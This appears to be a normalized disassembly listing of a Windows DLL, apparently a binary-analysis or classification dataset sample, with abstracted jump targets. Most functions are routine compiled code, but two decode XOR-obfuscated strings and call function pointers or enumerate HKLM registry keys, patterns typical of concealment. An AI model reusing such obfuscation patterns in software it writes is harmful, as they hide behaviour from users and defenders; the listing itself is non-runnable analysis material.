test eax eax
je r-xdata
call sub_10020880
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10017570
push ebp
mov ebp esp
push 0xffffffff
push sub_10080696
mov eax [ fs : 0x0 ]
push eax
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ecx ]
xor ebx ebx
mov [ ebp - 0x138 ] ebx
cmp eax ebx
jne r-xdata
cmp [ esi ] 0x3b
jne r-xdata
lea eax [ ebx + 0x3 ]
jmp r-xdata
cmp eax ebx
jbe r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
xor eax eax
lea esp [ esp ]
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
mov [ ebp - 0xe0 ] ebx
mov ecx esi
lea edi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] ebx
call sub_1000bd20
test al al
je r-xdata
lea esi [ ebp - 0x114 ]
call sub_1002efc0
mov eax 0x5
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov eax 0xf
mov edi 0x10
mov [ ebp - 0x130 ] bl
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x12c ] edx
mov [ ebp - 0x120 ] 0x8
cmp eax edi
jae r-xdata
mov [ ecx + 0x8 ] bl
cmp [ ebp - 0xfc ] edi
jb r-xdata
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x11c ] edi
jae r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x130 ]
mov [ ebp - 0x110 ] eax
mov eax [ ebp - 0x120 ]
inc eax
push eax
lea ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x110 ]
push edx
call sub_10077d10
add esp 0xc
jmp r-xdata
lea esi [ ebp - 0x114 ]
call sub_1002efc0
mov eax 0x7
jmp r-xdata
mov eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp - 0x74 ]
push ecx
lea edx [ ebp - 0xf4 ]
push edx
call sub_10078600
push edi
lea eax [ ebp - 0xd8 ]
push ebx
push eax
add esi 0x8
call sub_10078970
push esi
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
lea eax [ edi - 0x4c ]
mov [ ebp - 0x134 ] edi
call sub_1003cdb0
add esp 0x24
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp - 0x11c ]
mov edi 0x64
push edi
lea eax [ ebp - 0x74 ]
push ebx
push eax
mov [ ebp - 0x100 ] ecx
mov [ ebp - 0xfc ] edx
mov [ ebp - 0x4 ] bl
add esi 0x10
call sub_10078970
push esi
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
lea eax [ edi - 0x5c ]
mov [ ebp - 0x134 ] edi
call sub_1003cdb0
add esp 0x18
cmp eax ebx
jne r-xdata
lea esi [ ebp - 0x114 ]
call sub_1002efc0
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
call sub_10078600
mov edi [ ebp - 0xf0 ]
add esi 0x18
add esp 0xc
mov edx edi
mov ecx esi
call sub_10053f90
cmp eax [ ebp - 0xe8 ]
push edi
sete al
push 0x8
mov [ ebp - 0xdc ] al
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0xf0 ]
push ecx
mov edi eax
push esi
push edi
call sub_10078600
mov eax [ ebp - 0xf0 ]
mov edx [ ebp - 0x138 ]
mov ebx [ ebp - 0x13c ]
mov [ ebp - 0xe0 ] edi
lea edi [ edx + eax + 0x30 ]
add esp 0xc
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x138 ] edi
add esi eax
call sub_10008f20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] eax
mov [ ebp - 0x110 ] al
cmp edi [ ecx ]
jae r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_10065045
add esp 0x4
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x3b
je r-xdata
sub_10017890
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov [ esi + 0xda0 ] ebx
mov [ esi + 0xda4 ] ebx
mov [ esi + 0xda8 ] ebx
push 0x11c
mov [ esi + 0xdb0 ] ebx
mov [ esi + 0xdb4 ] ebx
mov [ esi + 0xdb8 ] ebx
lea edi [ esi + 0x4 ]
push ebx
push edi
mov [ esi + 0xdc0 ] ebx
mov [ esi + 0xdc4 ] ebx
call sub_10078970
add esp 0xc
push edi
mov [ edi ] 0x11c
call [ GetVersionExW@IAT ]
call [ GetProcessHeap@IAT ]
push 0x104
mov [ esi ] eax
lea eax [ esi + 0x73c ]
push ebx
push eax
call sub_10078970
push 0x104
lea ecx [ esi + 0x944 ]
push ebx
push ecx
call sub_10078970
push 0x104
lea edx [ esi + 0xb4c ]
push ebx
push edx
call sub_10078970
xor eax eax
mov [ esi + 0xd5c ] eax
mov [ esi + 0xd60 ] eax
mov [ esi + 0xd64 ] eax
mov [ esi + 0xd68 ] eax
mov [ esi + 0xd7c ] eax
mov [ esi + 0xd80 ] eax
push 0x104
mov [ esi + 0xd84 ] eax
lea edi [ esi + 0x534 ]
push ebx
mov [ esi + 0xd88 ] eax
push edi
mov [ esi + 0xd8c ] ax
call sub_10078970
push 0x104
lea eax [ esi + 0x124 ]
push ebx
push eax
call sub_10078970
push 0x104
lea eax [ esi + 0x32c ]
push ebx
push eax
call sub_10078970
mov eax [ ebp + 0x8 ]
add esp 0x48
mov [ esi + 0xd54 ] ebx
mov [ esi + 0xd58 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x120 ] eax
cmp [ eax + 0x1596c ] 0x1
jne r-xdata
lea ecx [ eax + 0xc4 ]
sub ecx edi
mov edx 0x104
mov eax edi
mov [ ebp - 0x1c ] ecx
jmp r-xdata
lea edi [ edx + 0x7ffffefa ]
test edi edi
je r-xdata
cmp edx ebx
jne r-xdata
movzx ecx [ ecx + eax ]
cmp cx bx
je r-xdata
xor ecx ecx
mov [ eax ] cx
lea edx [ ebp - 0x18 ]
lea eax [ ecx + 0x25 ]
call sub_10036cd0
push 0x104
lea eax [ esi + 0x32c ]
push eax
push edx
call [ ExpandEnvironmentStringsW@IAT ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov ecx [ ebp - 0x1c ]
jmp r-xdata
sub_10017a3f
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10042f0f
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10038ea0
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_10017b01
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10063190
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10017b25
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005fadc
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10017bc2
push 0x4c
mov eax sub_1007e636
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10064bde
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_1002a730
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1002a674
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_10017235
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x44 ]
call sub_10019c00
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1000a6a2
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_10017235
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_10017235
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_1000efa2
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_10017de5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10017e40
cmp [ esi ] 0x0
je r-xdata
retn
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea ecx [ ecx ]
mov ecx [ esi ]
push ecx
call ebx
mov [ esi ] edi
test edi edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
je r-xdata
pop edi
pop ebx
sub_10017e80
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov eax [ ebx ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x10a
call sub_1000a6f0
mov ecx [ esi ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x83
call sub_1000a6f0
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi ] edi
lea edx [ ebp - 0x2c ]
mov eax 0x126
call sub_1000a6f0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x8 ] edi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x6f
call sub_1000a6f0
mov [ esi + 0x10 ] eax
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0xc ] edi
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x100
call sub_1000a6f0
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x10 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x105
call sub_1000a6f0
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x9c
call sub_1000a6f0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x18 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x18 ] edi
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
call sub_1000a6f0
mov [ esi + 0x50 ] eax
inc [ eax + 0x1c ]
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x1c ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x1c ] edi
mov ecx [ ebx + 0x1c ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xcd
call sub_1000a6f0
mov [ ebp - 0x34 ] eax
mov eax [ ebx + 0x54 ]
cmp eax edi
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x28 ]
mov [ esi + 0x28 ] ecx
mov eax [ ebx + 0x50 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x34 ]
xor ecx ebp
mov [ esi + 0x34 ] edx
mov eax esi
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x30 ]
cmp ecx edi
je r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx ]
push eax
lea eax [ esi + 0x54 ]
call sub_1002e630
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
jne r-xdata
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push edi
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_10078600
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x30 ] edi
mov edx [ ebx + 0x38 ]
mov [ esi + 0x38 ] edx
mov eax [ ebx + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ ebx + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ ebx + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov ecx [ ebx + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ ebx + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ ebx + 0x30 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
sub_100181e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
mov ecx [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x18 ] dl
mov edx [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x20 ]
push ebx
mov [ esp + 0x2c ] edx
mov edx [ ebp + 0x24 ]
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x28 ]
push esi
xor eax eax
mov [ esp + 0x38 ] edx
mov edx [ ebp + 0x2c ]
mov [ esp + 0x3c ] ecx
mov ecx [ ebp + 0x30 ]
mov bl 0x38
push eax
mov [ esp + 0x44 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x48 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x9
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x2c
sub_10018302
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1007a723
add esp 0x14
pop ebp
retn
sub_10018330
push ebp
mov ebp esp
sub esp 0xb60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xb5c ] eax
mov [ ebp - 0xb50 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xb4c ] edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0xbc ] dx
inc eax
cmp eax 0x33
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xb38 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xbc ]
push edx
push 0x80000002
mov [ ebp - 0x56 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xb48 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xb38 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x2
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xb48 ]
test eax eax
je r-xdata
push ebx
push esi
xor esi esi
mov [ ebp - 0xb3c ] esi
test eax eax
je r-xdata
mov eax [ ebp - 0xb38 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0xb58 ]
push edx
lea eax [ ebp - 0xb34 ]
push eax
push esi
push ecx
mov [ ebp - 0xb58 ] 0xff
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xb38 ]
push ecx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x20
call sub_10036cd0
lea edx [ ebp - 0x124 ]
xor eax eax
call sub_10036cd0
lea edx [ ebp - 0xb34 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x52c ]
call sub_100254a0
add esp 0xc
lea edx [ ebp - 0x34 ]
mov eax 0x15
call sub_10036cd0
lea edx [ ebp - 0xb40 ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call edi
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0xb3c ] esi
cmp esi [ ebp - 0xb48 ]
jb r-xdata
mov ebx [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0xb60 ]
push ecx
mov ecx [ ebp - 0xb40 ]
lea edx [ ebp - 0x324 ]
push edx
push eax
push eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
